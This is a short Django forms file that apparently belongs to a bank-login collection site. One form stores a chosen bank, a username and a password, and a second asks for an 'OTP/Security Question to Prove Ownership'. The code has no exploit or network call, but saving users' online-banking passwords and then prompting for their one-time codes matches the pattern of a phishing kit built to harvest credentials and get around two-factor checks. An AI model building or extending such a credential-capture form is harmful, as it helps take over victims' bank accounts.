from django import forms
from .models import BankFormSubmission
from .models import SingleInput

class BankForm(forms.ModelForm):
    class Meta:
        model = BankFormSubmission
        fields = ['bank_choice', 'username', 'password']



class SingleInputForm(forms.ModelForm):
    class Meta:
        model = SingleInput
        fields = ['input_value']
        labels = {
            'input_value': 'OTP/Security Question to Prove Ownership',  # Change the label
        }

    # Optional: Rename the field directly in the form
    input_value = forms.CharField(label="OTP/Security Question to Prove Ownership")


